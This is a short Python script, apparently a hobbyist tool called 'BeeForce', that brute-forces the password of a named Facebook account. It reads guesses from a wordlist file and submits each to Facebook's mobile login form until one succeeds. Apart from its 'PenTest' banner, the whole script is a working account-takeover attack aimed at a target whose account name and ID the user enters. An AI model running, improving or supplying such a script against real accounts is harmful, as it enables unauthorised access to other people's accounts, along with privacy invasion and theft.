import mechanize
import itertools
import colorama
from colorama import init
init()
from colorama import Fore as F
import random
import urllib.request
import sys

    
try:
    urllib.request.urlopen("https://www.Google.com")
except:
    print(" --------No Internet Connection !---------")
    sys.exit()

MOZILLA_UAS = "Chrome/7.0.517.41 Safari/534.7"
LOGIN_URL = 'https://m.facebook.com/login.php'
def login(name,username,password):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    browser.open(LOGIN_URL)
    browser.select_form(nr=0)
    browser.form['email'] = username
    browser.form['pass'] = password
    d=str(browser.submit().read())
    return name in d
    

cores =F.BLUE
c1=F.RED
c2=F.GREEN
c3=F.MAGENTA
c4=F.WHITE
print(cores + """
	BeeForce For Facebook PenTest
	Made by MrHmdi
	<!>Our Creed Does Not Commend Us To Be Free It Command US To Be Wise<!>
	"""+c4)
name=str(input("Entre Target Account Name=> "))
email=str(input("Entre Target Account Id=> "))
print("-------Bimo Start Hacking----------")

p=open("pass.txt","r")
ch=p.readline()
while ch!="":
    ch=ch[:len(ch)-1]
    print(c3+"Test => "+ch)
    if login(name,email,ch):
        print(c2+"Suuccssfly Password Is => "+ch)
        break
    else:
        print(c1+"Field :(")
    ch=p.readline()
